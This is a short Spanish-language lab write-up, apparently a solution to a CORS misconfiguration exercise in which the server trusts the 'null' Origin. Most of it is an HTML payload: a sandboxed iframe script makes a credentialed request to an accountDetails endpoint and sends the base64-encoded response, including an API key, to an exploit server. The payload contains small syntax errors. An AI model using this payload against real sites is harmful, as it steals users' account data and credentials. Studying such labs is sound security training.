En este caso, sobre el recurso accountDetail, si meto la cabecera 

    Origin: test

No se ve reflejada en la respuesta de la peticion, pero si ponemos null, si se refleja

    Origin: null

Para este caso, hacemos el mismo ejercicio anterior, pero para que nos interpreta el Origin, debemos de hacerlo desdde un iframe, el cual, le vamos a dar privilegios de solo script, y darle el script que se ejecute pero dentro del iframe


```html
<iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = function(){
        location = 'https://exploit-server/?apikey= '' + btoa(req.responseText);
    };
    req.open('GET','https://burpsuite/accountDetails',true);
    req.withCredentials = true;
    req.send();

</script>>"
</iframe>
```

Y con esto tendriamos el ejercicio resuelto